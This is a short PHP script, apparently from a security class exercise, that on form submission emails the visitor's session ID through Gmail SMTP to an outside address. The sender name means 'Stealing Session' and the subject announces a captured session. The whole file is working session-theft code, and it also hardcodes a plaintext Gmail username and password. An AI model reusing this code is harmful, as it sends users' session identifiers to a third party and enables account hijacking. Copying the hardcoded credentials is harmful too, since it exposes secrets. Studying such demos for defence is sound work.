<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'vendor/autoload.php';

if(isset($_POST["enviar"])){
	session_start();
	$userSession = session_id();
	$_SESSION["user"] = $_POST["user"];

	$mail = new PHPMailer();
	$mail->IsSMTP();
	$mail->CharSet = 'UTF-8';

	$mail->Host= "smtp.gmail.com"; 
	$mail->SMTPDebug= 0;
	$mail->SMTPAuth=true;
	$mail->Port= 587;
	$mail->SMTPSecure = 'tls';  
	$mail->Username="owasp20@gmail.com";
	$mail->Password="Owasp2018";


	//Recipients
    $mail->setFrom('roba.sesiones@no-reply.com', 'Robando Sesion');
    $mail->addAddress('luis.cruz.f@tecsup.edu.pe', 'Robando Sesion');     // Add a recipient

	$mail->isHTML(true);                                  // Set email format to HTML
	
    $mail->Subject = 'Se ha obtenido la sesion de alguien';
	$mail->Body    = "<h1>La sesión de este usuario es:".$userSession."</h1> ";
	$mail->send();
	header("Location: principal.php");
	

}else{
	echo "Datos incorrectos";
}